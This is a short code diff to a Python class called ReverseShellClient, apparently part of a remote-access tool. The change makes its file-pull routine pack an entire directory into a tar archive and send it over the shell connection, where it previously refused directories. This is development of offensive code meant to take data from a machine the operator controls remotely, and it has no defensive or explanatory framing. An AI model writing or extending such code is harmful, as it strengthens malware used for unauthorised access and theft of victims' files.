@@ -3,6 +3,7 @@ import base64
 import getpass
 import hashlib
 import hmac
+import shutil
 import ssl
 import json
 import os
@@ -85,6 +86,9 @@ class ReverseShellClient:
 
     async def transferring(self, file):
         try:
+            if Path(file).is_dir():
+                file = shutil.make_archive(Path(file).name, 'tar', root_dir=file.removesuffix(Path(file).name),
+                                           base_dir=Path(file).name)
             # Send initial 'start' command to notify the receiver of an incoming file
             data = json.dumps({'cmd':'pull','stat': 'start', 'type': 'file', 'source_file': Path(file).name})
             await self.send_output(self.setup_data(dtype=data,stdout=''))
@@ -116,8 +120,6 @@ class ReverseShellClient:
                 await self.send_output(self.setup_data(stdout=f'All files have been successfully transferred'))
 
         # Handle common file-related errors gracefully
-        except IsADirectoryError:
-            await self.send_output(self.setup_data(stderr=f'{file} is a Directory', stdout=''))
         except PermissionError:
             await self.send_output(self.setup_data(stderr=f'Permission denied: {file}', stdout=''))
         except FileNotFoundError:
